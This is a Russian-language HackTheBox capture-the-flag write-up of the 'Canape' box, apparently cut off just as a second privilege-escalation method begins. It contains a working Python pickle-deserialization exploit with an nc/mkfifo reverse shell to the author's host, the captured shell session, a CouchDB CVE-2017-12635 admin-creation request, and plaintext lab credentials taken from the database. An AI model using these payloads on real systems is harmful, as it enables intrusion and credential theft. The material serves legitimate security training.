---
layout: post
title: "HTB: Canape Write-Up"
date: 2018-09-28 22:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Canape, linux, git, code-analysis, flask, python, deserialization, pickle, reverse-shell, couchdb, fake-pip]
comments: true
published: true
---

**Canape** — Linux-тачка средней сложности. Для начала нам предстоит столкнуться с сервером на *Flask*'е, проанализировать исходники Python-кода, найдя в них мою любимую *deserialization*-уязвимость, далее нас поджидает повышение привилегий до пользователя через эксплуатацию уязвимости в СУБД *CouchDB*, и напоследок мы поиграем с методами обмана питоновского менеджера управления пакетами *pip* с целью выполнения произвольных команд. Последнее подарит root-сессию. Log on, hack in! **Сложность: 5/10**{:style="color:grey;"}

<!--cut-->

[![canape-banner.png]({{ "/img/htb/boxes/canape/canape-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/134 "Hack The Box :: Canape")

<h4 style="color:red;margin-bottom:0;">Canape: 10.10.10.70</h4>
<h4 style="color:red;">Kali: 10.10.14.14</h4>

* TOC
{:toc}

# Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.70
Nmap scan report for 10.10.10.70
Host is up, received user-set (0.060s latency).
Scanned at 2018-09-26 17:51:18 EDT for 40s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 63
65535/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Sep 26 17:51:58 2018 -- 1 IP address (1 host up) scanned in 39.64 seconds
```

Version ([красивый отчет]({{ "/nmap/htb-canape-nmap-version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p80,65535 10.10.10.70
Nmap scan report for 10.10.10.70
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2018-09-26 17:52:50 EDT for 11s

PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDroCKFvZBROo3eo64hlNjhERjTLQmRgbCaDGhoWgs6qf9AfuTfS7LMX82ayuBjV0OHbk6Saf3SKwyLFfyLKj/mo8yGNpGjsZQ9uiN6hlpO39oQyjo9dy5DUfAabcoq82ugii982GWeHlTShQJAhAsG+7Uov2mUbO3YkKph/PBEv3uuAnNebhxlk9eg01yuHkk+8iyP6+Qp9ZzAVZsXpSuoH0raBA7VOIlYnm4Wti1AHy3VUtvmrB4KwZQT8Q3ZyMbufWFZlDB0N0/cEvyXF0kKwRIT1hNjp4HUNo0dwcDOWuwvrWVUpH3/q8VXkZRN3fL2gHsIsfuh+AyThM14hf/h
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLX3HkUlvdwKR+Ijy9ChJwvV7ILAPCEver9hmIr546JbveSJNyvOiq6y3YxfQu3IXomvonySAU10Fo8wVQ7kxWk=
|   256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvWPxb1XOvko0SIhYrC5TYyQpU8tugg1qirZdtt3CXX
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 26 17:53:01 2018 -- 1 IP address (1 host up) scanned in 11.81 seconds
```

С чего начинать — выбора немного. Web-сервер на 80-м порту, и SSH на нестандартном 65535-м. Поехали.

# Web — Порт 80
## Браузер
Перейдя по `http://10.10.10.70`, видим трехстраничный симпсоновский фан-сайт.

Home:

[![canape-port80-browser-1.png]({{ "/img/htb/boxes/canape/canape-port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-port80-browser-1.png" | relative_url }})

Character Quotes:

[![canape-port80-browser-2.png]({{ "/img/htb/boxes/canape/canape-port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-port80-browser-2.png" | relative_url }})

Submit Quote (распространенным инъекциям не поддается):

[![canape-port80-browser-3.png]({{ "/img/htb/boxes/canape/canape-port80-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-port80-browser-3.png" | relative_url }})

Забегая вперед скажу, что ни одна из этих вкладок не будет представлять для нас интереса. Разве что на последней вкладке мы уже сейчас можем видеть, что при попытке ввода имени персонажа, которое отсутствует в предполагаемом "белом списке", на нас накричат красной ошибкой:

[![canape-port80-browser-4.png]({{ "/img/htb/boxes/canape/canape-port80-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-port80-browser-4.png" | relative_url }})

А, если имя присутствует в "белом списке", нам разрешат отправить цитату и покажут зеленое сообщение об успехе:

[![canape-port80-browser-5.png]({{ "/img/htb/boxes/canape/canape-port80-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-port80-browser-5.png" | relative_url }})

При этом сама цитата на вкладке "Character Quotes" не появится. На этом заканчивается все полезное, что мы можем извлечь из видимой части сайта.

## dirb/dirbuster/gobuster
Не работают в нашей ситуации — тьма false-positive'ов. На каждый запрос сервер отдает `200`.

## wfuzz
Несмотря на то, что скриптовый движок nmap'а обнаружил (см. вывод nmap'а выше) git-репозиторий по адресу `http://10.10.10.70:80/.git/`, попробуем самостоятельно найти его с помощью утилиты `wfuzz`. Может заодно еще чего-нибудь интересное обнаружится :wink:

Выбрав прокаченную версию *common.txt* словаря из ассортимента [SecLists](https://github.com/danielmiessler/SecLists "danielmiessler/SecLists: SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.") и экспериментальным образом определив паттерны неудовлетворяющих нас ответов, получим такой результат:
```text
root@kali:~# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hl 0,82 http://10.10.10.70/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.70/FUZZ
Total requests: 4593

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000949:  C=403     11 L       32 W          294 Ch        "cgi-bin/"
000983:  C=405      4 L       23 W          178 Ch        "check"
003286:  C=200     85 L      227 W         3154 Ch        "quotes"
003597:  C=403     11 L       32 W          299 Ch        "server-status"
003837:  C=301      9 L       28 W          311 Ch        "static"
003881:  C=200     81 L      167 W         2836 Ch        "submit"
000008:  C=200      1 L        2 W           23 Ch        ".git/HEAD"

Total time: 33.81894
Processed Requests: 4593
Filtered Requests: 4586
Requests/sec.: 135.8114
```

Что ж, ныряем в `.git/HEAD`.

# .git
[![canape-port80-browser-6.png]({{ "/img/htb/boxes/canape/canape-port80-browser-6.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-port80-browser-6.png" | relative_url }})

Клонировать гит-репозиторий в нашем случае можно двумя способами.

Либо добавить пару строк в `/etc/hosts` и выполнить клонирование привычным образом:
```text
root@kali:~# echo '10.10.10.70    canape.htb git.canape.htb' >> /etc/hosts

root@kali:~# git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), done.
```

Либо просто сделать офлайн-слепок папки, как показано [здесь](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015 "Don't publicly expose .git or how we downloaded your website's sourcecode - An analysis of Alexa's 1M - Internetwache - A secure internet is our concern") (где также рассказывается, если вдруг это неочевидно, почему держать версионированный архив исходников сайта *в открытом доступе на самом сайте* не самая лучшая идея):
```text
root@kali:~# wget --mirror -I .git http://10.10.10.70/.git/
...
```

В любом случае у нас есть репозиторий:
```text
root@kali:~/simsons <master># ls -la
total 24
drwxr-xr-x 5 root root 4096 Sep 25 09:58 .
drwxr-xr-x 4 root root 4096 Sep 25 09:58 ..
drwxr-xr-x 8 root root 4096 Sep 25 10:03 .git
-rw-r--r-- 1 root root 2042 Sep 25 09:58 __init__.py
drwxr-xr-x 4 root root 4096 Sep 25 09:58 static
drwxr-xr-x 2 root root 4096 Sep 25 09:58 templates
```

Ветка одна, в коммитах ничего полезного (есть одно интересное сообщение к коммиту `c8a74a098a60aaea1af98945bd707a7eab0ff4b0`, но анализировать вывод `git diff` в письменном райтапе — совсем дикость, поэтому кому интересно, может посмотреть самостоятельно):
```text
root@kali:~/simsons <master># git branch
* master
~
...

root@kali:~/simsons <master># git checkout
Your branch is up to date with 'origin/master'.

root@kali:~/simsons <master># git log c8a7
commit c8a74a098a60aaea1af98945bd707a7eab0ff4b0
Author: Homer Simpson <homerj0121@outlook.com>
Date:   Mon Jan 15 18:46:30 2018 -0800

    temporarily hide check due to vulerability

```

Давайте заглянем под капот фан-сайта.

## Анализ кода
Для нас интерес представляет только бэкенд, а именно `__init__.py`:
```python
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5

app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

Сайт на Flask'е, использует CouchDB в качестве хранилища для цитат. Рассмотрим подробнее две функции: `submit()` и `check()`.

### submit()
Функция загрузки цитат на сайт:
```python
WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)
```

Что здесь происходит:
  1. Проверка, содержит ли строка с именем персонажа, которую ввел пользователь на сайте, любое из имен из белого список (да, список и правда существует!). Обратим внимание на неточность проверки: персонаж с именем `BartLisa`, ровно как и `HomerMargeBartLisaMaggieMoeCarlKrusty` оказался бы "валидным".
  2. Далее, если проверка успешно пройдена, создается файл с названием */tmp/&lt;md5-хеш-от-персонажа-и-цитаты&gt;.p* и содержимым *&lt;персонаж&gt;&lt;цитата&gt;*.

### check()
Функция проверки статуса загруженной цитаты (по логике "Опубликовано" / "Не опубликовано", но в данном случае будет всегда "Still reviewing"):
```python
@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item
```

Что здесь происходит:
  1. Открытие сервером файла с сохраненной цитатой по id (id это md5-хеш из предыдущего параграфа).
  2. Проверка наличия маркера `p1`, характерного для упакованных (сериализованных) данных.
  3. В случае успешно пройденной проверки начинается самое плохое (ествественно не для нас :smiling_imp:), а именно десериализация непроверенных данных с помощью `cPickle.loads()`. Почему это очень плохо, и делать так ни разу нельзя, можно почитать в сети, статей великое множество. Также, если заинтересовался темой, можешь полистать мою [статью с Хабра](https://habr.com/post/351360 "Искусство эксплойта минных полей: Разбираем CTF-таск про игру в Сапёра из «Мистера Робота» / Хабр"), описывающую таск из «Мистера Робота», в которой центральное место занимает **python-untrusted-deserialization** уязвимость.

Простыми словами эта -->  `cPickle.loads(data)`  <-- строчка кода отправляет ОС на выполнение все, что было упаковано в переменную `data`, т. е. все то, что мы сами указали ранее в качестве "цитаты".

Это обличает несложную схему для атаки:
  * скрафтим вредоносную нагрузку (реверс-шелл);
  * загрузим ее на сайт в виде цитаты персонажа из Симпсонов;
  * попросим сервер вернуть статус модерации (админом, полагаю) цитаты через обращения к методу `/check`.

### Эксплойт
Писать скрипт для эксплойта "вслепую" — довольно неудобная затея, поэтому я устанавливал Flask и CouchDB на локальную машину и тестировал работу вредоноса с бо́льшим комфортом. Предвидя возможные вопросы, отвечу сразу: использую модуль *cPickle* (а не *pickle*) и *python2* (а не *python3*), потому что сервер использует *cPickle* (а не *pickle*) и *python2* (а не *python3*) :smiley:

Должно получиться что-то вроде этого:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Usage: python canape_shell.py

import cPickle, hashlib, requests

LHOST = '10.10.14.14'
LPORT = '31337'
RHOST = '10.10.10.70'
RPORT = '80'

CHAR = 'krusty'


class Payload(object):
	def __init__(self, cmd):
		self.cmd = cmd
	def __reduce__(self):
		import os
		return (os.system, (self.cmd,))


reverse_sh = 'c=%s;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f' % (CHAR, LHOST, LPORT)
evilpickle = cPickle.dumps(Payload(reverse_sh))
sep_index = evilpickle.find(CHAR) + len(CHAR) + 1

data = {'character': evilpickle[:sep_index], 'quote': evilpickle[sep_index:]}
r = requests.post('http://' + RHOST + ':' + RPORT + '/submit', data=data)
print('POST {} {} {}'.format(r.status_code, r.url, data))

data = {'id': hashlib.md5(evilpickle).hexdigest()}
r = requests.post('http://' + RHOST + ':' + RPORT + '/check', data=data)
print('POST {} {} {}'.format(r.status_code, r.url, data))
```

Что здесь происходит:
  1. Реверс-шелл стандартный для *bash*'а за тем исключением, что в начале было прописано имя персонажа (`c=krusty`), чтобы обойти проверку на сервере.
  2. Создается объект класса `Payload`, с реверс-шеллом в качестве инициализационного значения. Класс `Payload` позволяет генерировать полезные нагрузки, которые будут выполнены интерпретатором при десериализация упакованных данных за счет перегрузки метода `__reduce__()`.
  3. Вычисляется индекс разбиения сериализованных данных: по левую сторону — заглушка для проверяющего механизма сайта (переменная с именем персонажа), по правую — то, что нужно непосредственно выполнить.
  4. Подготавливается и отправляется первый POST-запрос, создающий бэкдор.
  5. Подготавливается и отправляется второй POST-запрос, провоцирующий запуск бэкдора.

В итоге запустив скрипт:
```text
root@kali:~# python canape_shell.py
POST 200 http://10.10.10.70:80/submit {'quote': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 31337 >/tmp/f'\np2\ntRp3\n.", 'character': "cposix\nsystem\np1\n(S'c=krusty;"}
POST 500 http://10.10.10.70:80/check {'id': 'a7055ae5d0703e84ea83e69eaef172b2'}
```

Ловим шелл на локальном слушателе и прокачиваем его до tty'я:
```text
root@kali:~# nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.70.
Ncat: Connection from 10.10.10.70:54102.

/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@canape:/$ ^Z
[1]  + 24297 suspended  nc -nlvvp 31337
root@kali:~# stty raw -echo; fg 
[1]  + 24297 continued  nc -nlvvp 31337

www-data@canape:/$
www-data@canape:/$ stty cols 2000

www-data@canape:/$ whoami
www-data

www-data@canape:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@canape:/$ uname -a
Linux canape 4.4.0-119-generic #143-Ubuntu SMP Mon Apr 2 16:08:24 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Осмотримся:
```text
www-data@canape:/$ ps auxww
...
root        604  0.0  0.0   4240   660 ?        Ss   13:48   0:00 runsv couchdb
root        606  0.0  0.0   4384   680 ?        S    13:48   0:00 svlogd -tt /var/log/couchdb
...
homer       607  0.7  3.2 649340 32732 ?        Sl   13:48   0:05 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
...


www-data@canape:/$ netstat -anlpo | grep LIST
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
...
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
...
```

Конечно, я знал, что ищу: из init-скрипта стало известно о том, что на сервере будет крутиться CouchDB, а если задуматься о название бокса (фр. canapé — "[канапе](https://ru.wikipedia.org/wiki/Канапе_(мебель) "Канапе (мебель) — Википедия")"), все сразу станет на свои места.

# Захват пользователя
Мы знаем следующий шаг — это СУБД CouchDB (версии 2.0.0), найденная в запущенных процессах и слушающая свои дефолтные порты.

Постучимся же!
```text
www-data@canape:/$ curl -X GET http://127.0.0.1:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

Есть контакт. Пошаримся по базе:
```text
www-data@canape:/$ curl -X GET http://127.0.0.1:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]

www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}

www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons?include_docs=true
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"},"doc":{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"},"doc":{"_id":"f53679a526a868d44172c83a61000d86","_rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e","character":"Marge","quote":"I don’t want to alarm anybody, but I think there’s a little al-key-hol in this punch."}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"},"doc":{"_id":"f53679a526a868d44172c83a6100183d","_rev":"1-e522ebc6aca87013a89dd4b37b762bd3","character":"Bart","quote":"Eat My Shorts!"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"},"doc":{"_id":"f53679a526a868d44172c83a61002980","_rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc","character":"Maggie","quote":"Good night"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"},"doc":{"_id":"f53679a526a868d44172c83a61003068","_rev":"1-3d2f7da6bd52442e4598f25cc2e84540","character":"Lisa","quote":"Prayer. The last refuge of a scoundrel."}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"},"doc":{"_id":"f53679a526a868d44172c83a61003a2a","_rev":"1-4446bfc0826ed3d81c9115e450844fb4","character":"Apu","quote":"Please, could you just take the children home? The porno magazine buyers are too embarrassed to make their move. Look."}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"},"doc":{"_id":"f53679a526a868d44172c83a6100451b","_rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39","character":"Moe","quote":"Oh, business is slow. People today are healthier and drinking less. You know, if it wasn't for the junior high school next door, no one would even use the cigarette machine."}}
]}

www-data@canape:/$ curl -X GET http://127.0.0.1:5984/passwords
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

Успешно прочитали таблицу с цитатами Симпсонов, но вот для открытия загадочной БД `passwords` у нас не хватило прав. Это означает лишь одно — будем искать способ для обхода ограничений СУБД для повышения привилегий в системе. Таких способа 2 (использованных мной, вообще, может больше), ниже рассмотрим оба.

## PrivEsc: www-data → homer. Способ 1
Для начала спросим у searchsploit'а, какие способы повышения привилегий в рамках CouchDB существуют:
```text
searchsploit couchdb
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
Apache CouchDB - Arbitrary Command Execution (Metasploit)                | exploits/linux/remote/45019.rb
Apache CouchDB 1.7.0 and 2.x before 2.1.1 - Remote Privilege Escalation  | exploits/linux/webapps/44498.py
Apache CouchDB 2.0.0 - Local Privilege Escalation                        | exploits/windows/local/40865.txt
Apache CouchDB < 2.1.0 - Remote Code Execution                           | exploits/linux/webapps/44913.py
Couchdb 1.5.0 - 'uuids' Denial of Service                                | exploits/multiple/dos/32519.txt
------------------------------------------------------------------------- ----------------------------------------
```

*Apache CouchDB 1.7.0 and 2.x before 2.1.1 - Remote Privilege Escalation* отвечает за уязвимость под номером [CVE-2017-12635](https://nvd.nist.gov/vuln/detail/CVE-2017-12635 "NVD - CVE-2017-12635") и позволяет из-под гостя создавать пользователя с правами админа за счет некорректной обработки параметров JSON-парсером Javascript'а. В [этой](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html "Remote Code Execution in CouchDB") статье механизм уязвимости описан более подробно.

Не будем пользоваться готовым скриптом для эксплуатации, а самостоятельно сформируем вредоносный запрос с помощью curl:
```text
www-data@canape:/$ curl -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:3V1LH4CK3R \
--data-binary '{
  "type": "user",
  "name": "3V1LH4CK3R",
  "roles": ["_admin"],
  "roles": [],
  "password": "qwerty123"
}'
{"ok":true,"id":"org.couchdb.user:3V1LH4CK3R","rev":"1-a26b92cd5e22201ed1a5ee23f9eba1d9"}
```

Теперь для просмотра защищенного содержимого БД достаточно в теле запроса авторизоваться под только что созданным пользователем так:
```text
www-data@canape:/$ curl -X GET http://3V1LH4CK3R:qwerty123@127.0.0.1:5984/passwords
{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}
```

Или так:
```text
www-data@canape:/$ curl -X GET --user '3V1LH4CK3R:qwerty123' http://127.0.0.1:5984/passwords
{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}
```

Таким образом, попросим показать все, что содержится в базе данных `passwords`:
```text
www-data@canape:/$ curl -X GET http://3V1LH4CK3R:qwerty123@127.0.0.1:5984/passwords?include_docs=true
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"},"doc":{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"},"doc":{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"},"doc":{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"},"doc":{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}}
]}
```

Админ негодует :rage:

Нас интересует ssh-креды, а именно запись с id `739c5ebdf3f7a001bebb8fc4380019e4`:
```text
www-data@canape:/$ curl -X GET http://3V1LH4CK3R:qwerty123@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
```

Смотрим имя пользователя:
```text
www-data@canape:/$ cat /etc/passwd
...
homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
...
```

И забираем флаг:

```text
www-data@canape:/$ su - homer
Password: 0B4jyA0xtytZi7esBNGp

homer@canape:~$ whoami
homer

homer@canape:~$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)
```

### user.txt
```text
homer@canape:~$ cat /home/homer/user.txt
bce91869????????????????????????
```

На этом заканчивает первый способ PrivEsc'а.

## PrivEsc: www-data → homer. Способ 2
Второй способ заключается в выполнении команд через *Erlang эмулятор*.

CouchDB написан на Erlang'е, а Erlang использует сервер EPMD (и TCP `4369` порт) для того, чтобы иметь возможность находить другие ноды базы данных. В контексте кластеризации CouchDB слушает `5984` порт для standalone-доступа и `5986` порт для локальных нодов:
> CouchDB in cluster mode uses the port 5984 just as standalone, but it also uses 5986 for node-local APIs.
> Erlang uses TCP port 4369 (EPMD) to find other nodes, so all servers must be able to speak to each other on this port. In an Erlang Cluster, all nodes are connected to all other nodes. A mesh.

